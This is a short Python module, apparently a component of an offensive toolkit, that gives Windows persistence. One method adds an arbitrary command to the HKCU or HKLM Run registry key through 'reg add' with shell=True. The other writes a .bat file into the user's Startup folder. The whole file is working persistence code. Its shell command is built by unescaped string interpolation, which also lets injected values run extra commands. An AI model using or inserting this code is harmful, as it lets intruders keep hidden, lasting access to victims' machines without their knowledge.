import subprocess
import os

class RegistryPersistence:
    """Windows registry persistence"""
    
    @staticmethod
    def add_run_key(name, command, key='HKCU'):
        """Add to Run registry key"""
        if os.name != 'nt':
            return {'status': 'error', 'message': 'Windows only'}
        
        registry_paths = {
            'HKCU': 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            'HKLM': 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
        }
        
        path = registry_paths.get(key, registry_paths['HKCU'])
        cmd = f'reg add "{path}" /v "{name}" /t REG_SZ /d "{command}" /f'
        
        try:
            result = subprocess.run(cmd, capture_output=True, shell=True)
            return {
                'status': 'success' if result.returncode == 0 else 'error',
                'output': result.stdout.decode() + result.stderr.decode()
            }
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    @staticmethod
    def add_startup_folder(name, command):
        """Add to Startup folder"""
        startup_path = os.path.join(os.environ.get('APPDATA', ''), 
                                   'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        if not os.path.exists(startup_path):
            return {'status': 'error', 'message': 'Startup folder not found'}
        
        script_path = os.path.join(startup_path, f"{name}.bat")
        with open(script_path, 'w') as f:
            f.write(f'@echo off\n{command}\n')
        
        return {'status': 'success', 'path': script_path}
